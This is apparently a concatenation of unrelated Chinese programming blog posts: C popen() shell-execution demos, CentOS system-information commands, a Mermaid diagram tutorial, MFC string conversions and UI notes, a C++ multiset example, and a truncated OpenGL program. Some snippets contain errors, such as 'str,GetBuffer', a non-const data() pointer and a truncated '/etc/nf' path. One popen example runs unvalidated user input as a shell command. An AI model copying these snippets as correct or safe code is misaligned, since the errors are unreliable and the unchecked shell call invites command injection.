    printf("Hello world!\n");
    return 0;
}

上面的函数功能，就是ls -r这个命令的结果输出到调试窗口

下面是输入的版本：主要是调用popen函数，这个函数的缺点是要默认的开启一个sh

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define MAX_SIZE 1024

void InputShell(char * shell)
{
    FILE *read_fp = NULL;
    char buffer[MAX_SIZE];
    int chars_read = 0;

    memset(buffer, 0, sizeof(buffer));
    read_fp = popen(shell, "r");

    if (read_fp != NULL)
    {
        chars_read = fread(buffer, sizeof(char), MAX_SIZE, read_fp);
        while (chars_read > 0)//读取多数shell命令，shell命令比较长。
        {
            buffer[chars_read - 1] = 0;
            printf("Reading:\n%s\n", buffer);
            chars_read = fread(buffer, sizeof(char), MAX_SIZE, read_fp);
        }
        pclose(read_fp);

        //return EXIT_SUCCESS;
    }
}

int main()
{
    char shell[MAX_SIZE] = {0} ;//= NULL;
    //while(1)
    //{
           scanf("%s",shell);
    //gets(shell);
        InputShell(shell);
    //}



    return EXIT_FAILURE;
}

 





                                            
 


简单说一下popen()函数
函数定义

#include <stdio.h>

FILE * popen(const char *command , const char *type );
int pclose(FILE *stream);

函数说明
　　popen()函数通过创建一个管道，调用fork()产生一个子进程，执行一个shell以运行命令来开启一个进程。这个管道必须由pclose()函数关闭，而不是fclose()函数。pclose()函数关闭标准I/O流，等待命令执行结束，然后返回shell的终止状态。如果shell不能被执行，则pclose()返回的终止状态与shell已执行exit一样。
　　type参数只能是读或者写中的一种，得到的返回值（标准I/O流）也具有和type相应的只读或只写类型。如果type是"r"则文件指针连接到command的标准输出；如果type是"w"则文件指针连接到command的标准输入。
　　command参数是一个指向以NULL结束的shell命令字符串的指针。这行命令将被传到bin/sh并使用-c标志，shell将执行这个命令。
　　popen()的返回值是个标准I/O流，必须由pclose来终止。前面提到这个流是单向的（只能用于读或写）。向这个流写内容相当于写入该命令的标准输入，命令的标准输出和调用popen()的进程相同；与之相反的，从流中读数据相当于读取命令的标准输出，命令的标准输入和调用popen()的进程相同。
返回值
　　如果调用fork()或pipe()失败，或者不能分配内存将返回NULL，否则返回标准I/O流。popen()没有为内存分配失败设置errno值。如果调用fork()或pipe()时出现错误，errno被设为相应的错误类型。如果type参数不合法，errno将返回EINVAL。
 
附上一个例子：


//execute shell command
//执行一个shell命令，输出结果逐行存储在resvec中，并返回行数
int32_t myexec(const char *cmd, vector<string> &resvec) {
    resvec.clear();
    FILE *pp = popen(cmd, "r"); //建立管道
    if (!pp) {
        return -1;
    }
    char tmp[1024]; //设置一个合适的长度，以存储每一行输出
    while (fgets(tmp, sizeof(tmp), pp) != NULL) {
        if (tmp[strlen(tmp) - 1] == '\n') {
            tmp[strlen(tmp) - 1] = '\0'; //去除换行符
        }
        resvec.push_back(tmp);
    }
    pclose(pp); //关闭管道
    return resvec.size();
}
 
 
上面的那个vector<string>感觉不是很常用，所以改成一下sting版本了：

int myexec(const char *cmd, string &resvec)
 {
    resvec.clear();
    FILE *pp = popen(cmd, "r"); //建立管道
    if (!pp)
    {
        return -1;
    }
    char tmp[1024]; //设置一个合适的长度，以存储每一行输出
    while (fgets(tmp, sizeof(tmp), pp) != NULL)
     {
        if (tmp[strlen(tmp) - 1] == '\n')
        {
            tmp[strlen(tmp) - 1] = '\0'; //去除换行符
        }
        resvec.append(tmp);
    }
    pclose(pp); //关闭管道
    return resvec.size();
}

使用时候：
 
  string str_kernel;
    myexec("uname -sr",str_kernel);
    cout<<str_kernel<<endl;






















查看内核版本： uname -a
                         more /etc/*release 
                         more /etc/redhat-release
                         more /proc/version 
查看CPU信息：grep "model name" /proc/cpuinfo
                         more /proc/cpuinfo
查看CPU位数：getconf LONG_BIT
                         ls   如果在root下ls有lib64 文件夹说明系统64
查看libc、gcc版本：ldd /sbin/mii-tool
                                rpm -qa | grep glibc
                                gcc –v
查看内存信息：more /proc/meminfo
    grep MemTotal /proc/meminfo














CentOS查看CPU、内存、版本等系统信息
 

　　CentOS查看系统信息
　　一：查看CPU
　　more /proc/cpuinfo | grep "model name"
　　grep "model name" /proc/cpuinfo
　　如果觉得需要看的更加舒服
　　grep "model name" /proc/cpuinfo | cut -f2 -d:
 

　　
　　怎么样，linux的命令就要这样熟悉。
　　二：查看内存
　　grep MemTotal /proc/meminfo
　　grep MemTotal /proc/meminfo | cut -f2 -d:
　　free -m |grep "Mem" | awk '{print $2}'
　　三：查看cpu是32位还是64位
　　查看CPU位数(32 or 64)
　　#getconf LONG_BIT
　　#echo $HOSTTYPE
　　#uname -a
　　四：查看当前linux的版本
　　#more /etc/RedHat-release
　　#cat /etc/redhat-release
　　五：查看内核版本
　　#uname -r
　　#uname -a
　　六：查看当前时间
　　date
　　七：查看硬盘和分区
　　df -h
　　
　　fdisk -l
　　也可以查看分区
　　du -sh
　　可以看到全部占用的空间
　　du /etc -sh
　　可以看到这个目录的大小
 

　　八：查看安装的软件包
　　查看系统安装的时候装的软件包
　　cat -n /root/install.log
　　more /root/install.log | wc -l
　　查看现在已经安装了那些软件包
　　rpm -qa
　　rpm -qa | wc -l
　　yum list installed | wc -l
　　不过很奇怪，我通过rpm，和yum这两种方式查询的安装软件包，数量并不一样。没有找到原因。
　　九：查看键盘布局
　　cat /etc/sysconfig/keyboard
　　cat /etc/sysconfig/keyboard | grep KEYTABLE | cut -f2 -d=
　　十：查看selinux情况
　　sestatus
　　sestatus | cut -f2 -d:
　　cat /etc/sysconfig/selinux
　　十一：查看ip，mac地址
　　在ifcfg-eth0 文件里你可以看到mac，网关等信息。
　　ifconfig
　　cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IPADDR
　　cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IPADDR | cut -f2 -d=
　　ifconfig eth0 |grep "inet addr:" |awk '{print $2}'|cut -c 6-
　　ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'
　　查看网关
　　cat /etc/sysconfig/network
　　查看dns
　　cat /etc/nf
　　十二：查看默认语言
　　echo $LANG $LANGUAGE
　　cat /etc/sysconfig/i18n
　　十三：查看所属时区和是否使用UTC时间
　　cat /etc/sysconfig/clock
　　十四：查看主机名
　　hostname
　　cat /etc/sysconfig/network
　　修改主机名就是修改这个文件，同时最好也把host文件也修改
 
 
1. 内核版本：popen("uname -sr", "r");
2.内存容量：/proc/meminfo ‘MemTotal:’字段
3.操作系统版本：/etc/issue 或者 /etc/*ease
4.当前用户名：a.getuid()获取当前用户的uid;b.getpwuid(uid)或者用户名
5.cpu名称:/proc/cpuinfo ’model name‘字段
6.cpu内核数：/proc/cpuinfo 'processor'字段最大值+1(逻辑核数)， 'physical id'字段最大值 + 1







 








作者：黄永刚
mermaid简介

当撰写文档的时候，对于流程图的生成大多使用Visio等繁重的工具，没有一种轻便的工具能够画图从而简化文档的编写，就像markdown那样。
mermaid解决这个痛点，这是一个类似markdown语法的脚本语言，通过JavaScript实现图表的生成。 
先来看个例子:
1.流程图(flowchart)
graph LR;  
　　A-->B;    
　　A-->C;  
　　B-->D;  
　　C-->D;  
生成的图表如下所示：
 
2. 时序图(sequence diagram)
sequenceDiagram
　　　participant Alice
　　　participant Bob
　　　Alice->John:Hello John, how are you?
　　　loop Healthcheck
　　　　　John->John:Fight against hypochondria
　　　end
　　　Note right of John:Rational thoughts <br/>prevail...
　　　John-->Alice:Great!
　　　John->Bob: How about you?
　　　Bob-->John: Jolly good!
生成的图表如下所示：

3.甘特图(gantt diagram)
gantt
　　　dateFormat　YYYY-MM-DD
　　　title Adding GANTT diagram functionality to mermaid
　　　section A section
　　　Completed task　　:done, des1, 2014-01-06,2014-01-08
　　　Active task 　　　　:active, des2, 2014-01-09, 3d
　　　future task 　　　　:　　　  des3, after des2, 5d
　　　future task2　　　　:　　　  des4, after des3, 5d
　　　section Critical tasks
　　　Completed task in the critical line　:crit, done, 2014-01-06,24h
　　　Implement parser and json　　　　　　:crit, done, after des1, 2d
　　　Create tests for parser　　　　　　　:crit, active, 3d
　　　Future task in critical line　　　　　:crit, 5d
　　　Create tests for renderer　　　　　　:2d
　　　Add to ,mermaid　　　　　　　　　　　:1d
生成的表如下：


下游项目
Mermaid 是由Knut Sveidqbist发起旨在轻便化的文档撰写。所有开发者:开发者列表

Gitbook-plugin
Light table
Confluence plugin
Using mermaid via docpad
Using mermaid in Jekvll
Using mermaid via Octopress
Mardown editor Haroopad
Plugin for atom
Markdown Plus
LightPaper 1.2+
Vim Plugin 
以上的这些都有集成mermaid或者开发相关的插件。

Graph
graph LR
    A --> B
 
这是申明一个由左到右，水平向右的图。\ 
可能方向有： 
- TB - top bottom 
- BT - bottom top 
- RL - right left 
- LR - left right 
- TD - same as TB

节点与形状
默认节点

graph LR 
  id1

 
注意：’id’显示在节点内部。
文本节点

graph LR
id[This is the text in the box];
圆角节点

graph LR
id(This is the text in the box);
圆节点(The form of a circle)

graph LR
id((This is the text in the circle));
非对称节点(asymetric shape)

graph LR
id>This is the text in the box]
菱形节点(rhombus)

graph LR
id{This is the text in the box}

连接线
节点间的连接线有多种形状，而且可以在连接线中加入标签：
箭头形连接

graph LR;
  A-->B;
开放行连接

graph LR
A --- B
标签连接

graph LR
A -- This is the label text --- B;
箭头标签连接

A–>|text|B\ 
  或者\ 
  A– text –>B


graph LR
 A-- text -->B
虚线(dotted link,点连线)

-.->


graph LR
A-.->B

-.-.


graph LR
A-.-.B
标签虚线

-.text.->

graph LR
A-.text.->B

粗实线

==>

graph LR
A==>B


===

graph LR
A===B

标签粗线

=\=text\==>

graph LR
A==text==>B


=\=text\===

graph LR
A==text===B


特殊的语法
使用引号可以抑制一些特殊的字符的使用，可以避免一些不必要的麻烦。

graph LR\ 
    d1[“This is the (text) in the box”]

graph LR
d1["This is the (text) in the box"]

html字符的转义字符
转义字符的使用语法： 
流程图定义如下：

graph LR\ 
          A[“A double quote:#quot;”] –> B[“A dec char:#9829;”]

渲染后的图如下： 

graph LR
        A["A double quote:#quot;"]-->B["A dec char:#9829;"]
子图(Subgraphs)

subgraph title\ 
        graph definition\ 
    end

示例：
graph TB
        subgraph one
        a1 --> a2
        en
        subgraph two
        b2 --> b2
        end
        subgraph three
        c1 --> c2
        end
        c1 --> a2
结果：

基础fontawesome支持
如果想加入来自frontawesome的图表字体,需要像frontawesome网站上那样引用的那样。\ 
详情请点击：fontawdsome
引用的语法为：++fa:#icon class name#++
graph TD
      B["fa:fa-twitter for peace"]
      B-->C[fa:fa-ban forbidden]
      B-->D(fa:fa-spinner);
      B-->E(A fa:fa-camerra-retro perhaps?);
渲染图如下：
graph TD
      B["fa:fa-twitter for peace"]
      B-->C[fa:fa-ban forbidden]
      B-->D(fa:fa-spinner);
      B-->E(A fa:fa-camera-retro perhaps?);

以上reference： 
    1.mermaid docs

第二部分—图表(graph)

定义连接线的样式
graph LR
     id1(Start)-->id2(Stop)
     style id1 fill:#f9f,stroke:#333,stroke-width:4px;
     style id2 fill:#ccf,stroke:#f66,stroke-width:2px,stroke-dasharray:5,5;
渲染结果：

graph LR
     id1(Start)-->id2(Stop)
     style id1 fill:#f9f,stroke:#333,stroke-width:4px;
     style id2 fill:#ccf,stroke:#f66,stroke-width:2px,stroke-dasharray:5,5;
备注：这些样式参考CSS样式。
样式类
为了方便样式的使用，可以定义类来使用样式 
类的定义示例：
classDef className fill:#f9f,stroke:#333,stroke-width:4px;
对节点使用样式类：
class nodeId className;
同时对多个节点使用相同的样式类：
class nodeId1,nodeId2 className;
可以在CSS中提前定义样式类，应用在图表的定义中。
graph LR
      A-->B[AAABBB];
      B-->D;
      class A cssClass;
默认样式类：\ 
当没有指定样式的时候，默认采用。
classDef default fill:#f9f,stroke:#333,stroke-width:4px;
示例：
graph LR
    classDef default fill:#f90,stroke:#555,stroke-width:4px;
    id1(Start)-->id2(Stop)
结果：
graph LR
classDef default fill:#f90,stroke:#555,stroke-width:4px;
id1(Start)-->id2(Stop)

序列图(sequence diagram)1
序列图
示例：
sequenceDiagram
　　Alice->>John: Hello John, how are you ?
　　John-->>Alice: Great!
　　Alice--->>John: Huang,you are better .
　　John-->>Alice: yeah, Just not bad.
sequenceDiagram
　　Alice->>John: Hello John, how are you ?
　　John-->>Alice: Great!
　　Alice->>John: Hung,you are better .
　　John-->>Alice: yeah, Just not bad.
 
观察上面的图，如果想让John出现在前面，如何控制，mermaid通过设定参与者(participants)的顺序控制二者的顺序。上面的图可以做如下修改：

sequenceDiagram\ 
  　　participant John\ 
  　　participant Alice\ 
  　　Alice->>John:Hello John,how are you?\ 
  　　John–>>Alice:Great!

sequenceDiagram
　　participant John
　　participant Alice
　　Alice-xJohn:Hello John,how are you?
　　John-->>Alice:Great!
 
消息的语法： 
　　实线或者虚线的使用： 
[Actor][Arrow][Actor]:Message text\ 
Arrow的六种样式：

->
–>
->>
–>>
-x
–x

示例：
sequenceDiagram
    Alice->John: Hello John, how are you ?
    John-->Alice:Great!
    Alice->>John: dont borther me !
    John-->>Alice:Great!
    Alice-xJohn: wait!
    John--xAlice: Ok!

便签
给序列图增加便签：\ 
具体规则：\ 
[right of | left of | over][Actor]:Text\ 
示例：
sequenceDiagram
　　participant John
　　Note left of John: Text in note
结果：

跨越两个Actor的便签：
sequenceDiagram
　　Alice->John:Hello John, how are you?
　　Note over Alice,John:A typical interaction
sequenceDiagram
Alice->>John:Hello John, how are you?
Note over Alice,John:A typical interaction

循环Loops
在序列图中，也可以使用循环，具体规则如下：
loop Loop text
... statements...
end
示例：
sequenceDiagram
　　Alice->>John: Hello!
　　loop Reply every minute
　　　　John->>Alice:Great!
　　end
渲染结果：

选择ALT
在序列图中选择的表达。规则如下：
alt Describing text
...statements...
else
...statements...
end
或者使用opt(推荐在没有else的情况下使用)
opt Describing text
...statements...
end
示例：
sequenceDiagram
　　Alice->>Bob: Hello Bob, how are you?
　　alt is sick
　　　　Bob->>Alice:not so good :(
　　else is well
　　　　Bob->>Alice:Feeling fresh like a daisy:)
　　end
　　opt Extra response
　　　　Bob->>Alice:Thanks for asking
　　end
渲染结果如下：


甘特图(gantt)2
甘特图是一类条形图，由Karol Adamiechi在1896年提出, 而在1910年Henry Gantt也独立的提出了此种图形表示。通常用在对项目终端元素和总结元素的开始及完成时间进行的描述。
示例：
gantt
dateFormat YYYY-MM-DD

section S1
T1: 2014-01-01, 9d

section S2
T2: 2014-01-11, 9d

section S3
T3: 2014-01-02, 9d
gantt
dateFormat YYYY-MM-DD
section S1
T1: 2014-01-01, 9d
section S2
T2: 2014-01-11, 9d
section S3
T3: 2014-01-02, 9d

先来看一个大的例子：
    gantt
    dateFormat  YYYY-MM-DD
    title Adding GANTT diagram functionality to mermaid

    section A section
    Completed task            :done,    des1, 2014-01-06,2014-01-08
    Active task               :active,  des2, 2014-01-09, 3d
    Future task               :         des3, after des2, 5d
    Future task2               :         des4, after des3, 5d

    section Critical tasks
    Completed task in the critical line :crit, done, 2014-01-06,24h
    Implement parser and jison          :crit, done, after des1, 2d
    Create tests for parser             :crit, active, 3d
    Future task in critical line        :crit, 5d
    Create tests for renderer           :2d
    Add to mermaid                      :1d

    section Documentation
    Describe gantt syntax               :active, a1, after des1, 3d
    Add gantt diagram to demo page      :after a1  , 20h
    Add another diagram to demo page    :doc1, after a1  , 48h

    section Last section
    Describe gantt syntax               :after doc1, 3d
    Add gantt diagram to demo page      : 20h
    Add another diagram to demo page    : 48h
获得的图渲染后如下： 




header 1
header 2



title
标题


dateFormat
日期格式


section
模块


Completed
已经完成


Active
当前正在进行


Future
后续待处理


crit
关键阶段


日期缺失
默认从上一项完成后


关于日期的格式可以参考： 
- string-format 
- Time-Formatting
Demo
graph TB
    sq[Square shape] --> ci((Circle shape))

    subgraph A subgraph
        di{Diamond with  line break} -.-> ro(Rounded)
        di==>ro2(Rounded square shape)
    end

    e --> od3>Really long text with linebreak<br>in an Odd shape]

    cyr[Cyrillic]-->cyr2((Circle shape Начало));

    classDef green fill:#9f6,stroke:#333,stroke-width:2px;
    classDef orange fill:#f96,stroke:#333,stroke-width:4px;
    class sq,e green
    class di orange

reference
mermaid docs

本文原创首发于公众号：老王和他的IT界朋友们
微信扫描关注微信号：（原创投稿有惊喜！！！）









序列图的样式的定制需要在可以渲染CSS的地方才可使用，具体可以查阅参考。 ↩甘特图的样式的定制需要在可以渲染CSS的地方才可使用，具体可以查阅参考。 ↩ 






MFC中char*,string和CString之间的转换




一、    将CString类转换成char*(LPSTR)类型
方法一，使用强制转换。例如： 
CString theString( "This  is a test" ); 
LPTSTR lpsz =(LPTSTR)(LPCTSTR)theString; 
方法二，使用strcpy。例如： 
CString theString( "This  is a test" ); 
LPTSTR lpsz = new TCHAR[theString.GetLength()+1]; 
_tcscpy(lpsz, theString); 
方法三，使用CString::GetBuffer。例如： 
CString s(_T("This is a  test ")); 
LPTSTR p = s.GetBuffer(); 
// 在这里添加使用p的代码 
if(p != NULL) *p =  _T('\0'); 
s.ReleaseBuffer(); 
// 使用完后及时释放，以便能使用其它的CString成员函数
CString str = "ABCDEF"; 
char *pBuf = str,GetBuffer( 0 ); 
str.ReleaseBuffer();
二、     string转char*
string 是c++标准库里面其中一个，封装了对字符串的操作
把string转换为char* 有3种方法：
1。data(),返回没有”\0“的字符串数组 
如：
string str="abc";
char  *p=str.data();
2.c_str 返回有”\0“的字符串数组 
如：string  str="gdfd";
    char *p=str.c_str();
3 copy
比如
string  str="hello";
char p[40];
str.copy(p,5,0); //这里5，代表复制几个字符，0代表复制的位置
*(p+5)='\0';  //要手动加上结束符
cout < < p;
三、     字符串string转换为其它数据类型
temp="123456";
1）短整型(int)
i =  atoi(temp);
2）长整型(long)
l =  atol(temp);
3）浮点(double)
d =  atof(temp);
string s; d= atof(s.c_str());
4）BSTR变量
BSTR bstrValue =  ::SysAllocString(L"程序员");
...///完成对bstrValue的使用
SysFreeString(bstrValue);
5）CComBSTR变量
CComBSTR类型变量可以直接赋值
CComBSTR  bstrVar1("test");
CComBSTR bstrVar2(temp);
6）_bstr_t变量
_bstr_t类型的变量可以直接赋值
_bstr_t  bstrVar1("test");
_bstr_t bstrVar2(temp);
四、     Char*转换为string
如果要把一个char 转换成string, 可以使用 string s(char  *); 
五、string 转CString  
CString.format("%s",  string.c_str()); 
六、char 转CString  CString.format("%s", char*); 
七、     CString -> string 
string  s(CString.GetBuffer());  
GetBuffer()后一定要ReleaseBuffer(),否则就没有释放缓冲区所占的空间.
八、CString互转int
将字符转换为整数，可以使用atoi、_atoi64或atol。  
而将数字转换为CString变量，可以使用CString的Format函数。如  
CString s;  
int i =  64;  
s.Format("%d", i) 









2012-4-23
2.The Fingerprint Contrast and Analysis System
3.参照书上代码将程序背景图片处理好。
 
4.add new image 窗口出现时大小正好为整个客户区
CRect rect;
pView->GetClientRect(rect);
ClientToScreen(rect);
pDlg->MoveWindow(rect);
 
 
5.vc6的风格转换为 vs2008的风格
解决方案：stdafx.h文件里
加上
#if defined _M_IX86
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_IA64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='ia64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif
 
 
7.改变程序tittle
----在程序创建之前，框架类中可以如下形式创建：
        cs.style&=~FWS_ADDTOTITLE;//取反后与，现有类型做于操作即可去掉这个类型
 cs.lpszName=_T("The Fingerprint Contrast and Analysis System");
-----在程序创建之后，可以再oncreat()函数中如下创建
SetWindowLong();
-----程序创建之前：
 WNDCLASS wndcls;
 wndcls.cbClsExtra=0;
 wndcls.cbWndExtra=0;
 wndcls.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);   //创建有颜色的背景画刷,这一句必须有。
 wndcls.hCursor=LoadCursor(NULL,IDC_HELP);          //选择help的cursor
 wndcls.hIcon=LoadIcon(NULL,IDI_ERROR);
 wndcls.hInstance=AfxGetInstanceHandle();
 wndcls.lpfnWndProc=::DefWindowProc;
 wndcls.lpszClassName=_T("The Fingerprint Contrast and Analysis System");
 wndcls.lpszMenuName=NULL; 
 wndcls.style=CS_HREDRAW |CS_VREDRAW;          //横向重绘，纵向重绘
 RegisterClass(&wndcls);
 cs.lpszClass=_T("The Fingerprint Contrast and Analysis System");
在框架窗口中，只能改变窗口title的图标。
而改变背景和，鼠标的图标应该在view类中改变
cs.lpszClass=AfxRegisterWndClass(CS_HREDRAW|CS_VREDRAW,0,0,LoadIcon(NUll,IDI_WARING));
----程序创建之后：框架类Oncreat()中
SetClassLong
---动态图标的创建
----1.首先导入图标，添加HICON变量类型m_hicons[]
----2.oncreate()函数中
 m_hicons[0]=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON1));
 m_hicons[1]=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON2));
 m_hicons[2]=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON3));
 m_hicons[3]=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON4));
 m_hicons[4]=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON5));
 SetTimer(1,500,NULL);
----3.相应onTime()时间
 static int index=0;
 SetClassLong(m_hWnd,GCL_HICON,(LONG)m_hicons[index]);
 index=++index%5;
8.创建菜单快捷按钮只需要id何菜单相同即可
 
9.给程序右下角添加时间，在框架类中添加
------1，添加静态字符串资源
 static UINT indicators[] =
 {
 ID_SEPARATOR,           // status line indicator
 IDS_TIMER,
 IDS_PROGRESS,
 ID_INDICATOR_CAPS,
 ID_INDICATOR_NUM,
 ID_INDICATOR_SCRL,
 };
 并注册
-----2，添加下列代码获取时间，需要在timer中添加
   CTime t=CTime::GetCurrentTime();
 CString str=t.Format("%H:%M:%S");//得到时间后格式化
 CClientDC dc(this);
 CSize sz=dc.GetTextExtent(str);//得到字体时间的长度
 m_wndStatusBar.SetPaneInfo(1,IDS_TIMER,SBPS_NORMAL,sz.cx);
 m_wndStatusBar.SetPaneText(1,str);
 
10.创建进度栏
----1.首先构造进度栏对象CProgressCtrl m_progress;
----2.oncreat()函数返回之前创建进度栏
----3.自定义一个消息，只要比WM_USER 大即可，
 #define UM_PROGRESS  WM_USER+1
 并且做消息响应函数原型的声明，(注释宏的下面)
 afx_msg LRESULT OnProgress(WPARAM wParam, LPARAM lParam);
        
----4.进行消息映射ON_MESSAGE
----5.定义函数
 LRESULT CMainFrame::OnProgress(WPARAM wParam, LPARAM lParam)
{
 CRect rect;
 m_wndStatusBar.GetItemRect(2,&rect);
 
 m_progress.Create( WS_CHILD | WS_VISIBLE | PBS_SMOOTH, 
  rect,&m_wndStatusBar,123);
 m_progress.SetPos(0);
 return true;
}
----6.onCreate()后发送消息
SendMessage(UM_PROGRESS);直接把消息响应函数发送给消息响应函数，完后再返回。没有达到直接从此处发送消息的目的
PostMessage(UM_PROGRESS);将消息放置在消息队列当中，执行时间靠后，等create完成后再创建滚动条
若注释起来，则上述函数便不会执行。
----7.增加OnPaint()消息处理
 在窗口重绘的时候，从新让进度条出现
 复制定义函数的代码，会出现问题----进度条已经创建了，并且和类进行了关联，再次创建会出现问题
所以需要如下代码：
 CRect rect;
 m_wndStatusBar.GetItemRect(2,&rect);
 if(!m_progress.m_hWnd)
  m_progress.Create(WS_CHILD | WS_VISIBLE ,//| PBS_SMOOTH,
   rect,&m_wndStatusBar,123);
 else
  m_progress.MoveWindow(rect);
 m_progress.SetPos(50);
 
----8.进度条的移动
 timer中////////////////////////////////////////////////进度条显示
 m_progress.StepIt();

 
 
SkinSharp收费，但是可以使用试用版，还是可以满足咱的需求的，总比MFC本身的界面好，那颜色...拿不出手啊....
使用很简单，就下面几个步骤：
1.
拷贝.h文件和.lib文件到程序目录下；
2. 在工程的stdafx.h 头文件，添加以下代码：
        #include "SkinH.h"
#pragma comment (lib,"SkinHu.lib") 
     3. 对话框初始化函数OnInitDialog()里面添加以下代码，加载皮肤：SkinH_Attach(); 这个方法只加载试用版默认的皮肤。
     4. 编译下工程，产生Debug或Release文件夹，把DLL文件(SkinHu.dll )和皮肤文件(skinh.she )拷贝到此。
     这样就行了。其实很多皮肤的使用方法都很简单，基本上就是拷贝一下.dll和.lib以及头文件，然后在程序中加几行代码。但是由于绝大部分皮肤都收费，还有可能因为版本、编程环境等原因，很多皮肤都用不上，目前为止在我电脑上能用的皮肤就SkinSharp和SkinPlusPlus，这两个使用都简单。但SkinPlusPlus会截获OnTimer()等方法，很让人郁闷，不知道SkinSharp如何，用着再说。

 






#include <set>
#include <iostream>
using namespace std;

struct Student
{
	char *name;
	int year;
	char *addr;
};



void find_test()
{
	multiset<int> ms;
	ms.insert(10);
	ms.insert(11);
	ms.insert(12);
	ms.insert(13);
	ms.insert(14);
	ms.insert(15);
	ms.insert(16);
	ms.insert(17);
	ms.insert(18);
	ms.insert(13);
	ms.insert(19);

	//find the element 13

	int v = 19;
	multiset<int>::iterator i_v = ms.find(v);

	cout<<*i_v<<endl;
	
	//equal_range search the element 13
	v = 13;
	pair<multiset<int>::iterator , multiset<int>::iterator> p = ms.equal_range(v);

	cout<<"大于等于"<<v<<"的第一个元素为（x>=k）为 "<<*p.first<<endl;
	cout<<"大于"<<v<<"的第一个元素（x>k）为 "<<*p.second<<endl;


	//打印重复键值元素13

	multiset<int>::iterator i;
	cout<<"键值为 "<< v <<"的所有元素为 ";
	for (i = p.first; i!=p.second; i++)
	{
		cout<<*i<<' ';
	}

	cout<<endl;
	cout<<endl;



}


//比较函数

struct StudentLess
{
	bool operator()(const Student &s1, const Student &s2)const
	{
		return (s1.year) < (s2.year) ;
	}
};


void other_multiset()
{
	Student stuArray[] = 
	{
		{" 李强", 21, "北京"},
		{" 月月", 23, "西安"},
		{" 大力", 21, "美国"},
		{" 小二", 22, "南非"},
		{" 小明", 23, "日本"},
	};

	//create a object of multiset
	multiset<Student, StudentLess>ms(stuArray, stuArray+5, StudentLess());

	//count
	cout<<"学生人数： "<<ms.size()<<endl<<endl;
	cout<<"年龄为21岁的学生人数"<<ms.count(stuArray[0])<<endl<<endl;

	//print all
	//multiset<Student>::iterator i, iend;//报错！！！
	//<c++ STL开发技术导引>上的代码是这么写的，vs2010报错，和下面的迭代器类型不同
	multiset<Student, StudentLess>::iterator i, iend;
	iend=ms.end();

	cout<<"姓名    " <<"年龄    "<<"地址    \n";
	for (i=ms.begin(); i!=iend; i++)
	{
		cout<<(*i).name<<"    "<<(*i).year<<"    "<<(*i).addr<<"    "<<endl;
	}

	cout<<endl;
}


int main()
{
	find_test();
	other_multiset();

	getchar();

	return 0;
}
 
 
结果：

 
 
下面链接是当时出现的问题：
http://bbs.csdn.net/topics/390724469?page=1#post-396890764

 






#include "stdafx.h"
#include <windows.h>		// Windows的头文件
#include<stdio.h>
//#include <gl/glew.h>		// 包含最新的gl.h,glu.h库
//#include <gl/glut.h>		// 包含OpenGL实用库
#include <gl/glaux.h>							// GLaux库的头文件
//#include<gl/GLU.h>




#pragma comment(lib, "opengl32.lib") 
#pragma comment(lib, "glu32.lib") 
#pragma comment(lib, "glut32.lib") 
#pragma comment(lib,"glaux.lib")//注意此处,此课的代码多添加了这个静态库的使用//详见帖子:http://topic.csdn.net/u/20120823/10/c38703fc-8f7e-4b12-8460-afb7014efdf8.html

HGLRC           hRC=NULL;							// 窗口着色描述表句柄
HDC             hDC=NULL;							// OpenGL渲染描述表句柄
HWND            hWnd=NULL;							// 保存我们的窗口句柄
HINSTANCE       hInstance;							// 保存程序的实例

bool	keys[256];								// 保存键盘按键的数组
bool	active=TRUE;								// 窗口的活动标志，缺省为TRUE
bool	fullscreen=TRUE;							// 全屏标志缺省，缺省设定成全屏模式

GLfloat		rtri;						// 用于三角形的角度
GLfloat		rquad;						// 用于四边形的角度

GLfloat		xrot;								// X 旋转量
GLfloat		yrot;								// Y 旋转量
GLfloat		zrot;								// Z 旋转量

GLuint		texture[1];							// 存储一个纹理

AUX_RGBImageRec *LoadBMP(char *Filename)					// 载入位图图象
{
	FILE *File=NULL;							// 文件句柄

	if (!Filename)								// 确保文件名已提供
	{
		return NULL;							// 如果没提供，返回 NULL
	}
	File=fopen(Filename,"r");						// 尝试打开文件
	if (File)								// 文件存在么?
	{
		fclose(File);							// 关闭句柄
		return auxDIBImageLoad(Filename);				// 载入位图并返回指针
	}
	return NULL;								// 如果载入失败，返回 NULL
}


int LoadGLTextures()								// 载入位图(调用上面的代码)并转换成纹理
{

	int Status=FALSE;							// 状态指示器
	AUX_RGBImageRec *TextureImage[1];					// 创建纹理的存储空间
	memset(TextureImage,0,sizeof(void *)*1);				// 将指针设为 NULL
	// 载入位图，检查有无错误，如果位图没找到则退出
	if (TextureImage[0]=LoadBMP("shit.bmp"))
	{
		Status=TRUE;							// 将 Status 设为 TRUE
		glGenTextures(1, &texture[0]);					// 创建纹理

		// 使用来自位图数据生成 的典型纹理
		glBindTexture(GL_TEXTURE_2D, texture[0]);
		// 生成纹理
		glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage[0]->sizeX, TextureImage[0]->sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage[0]->data);

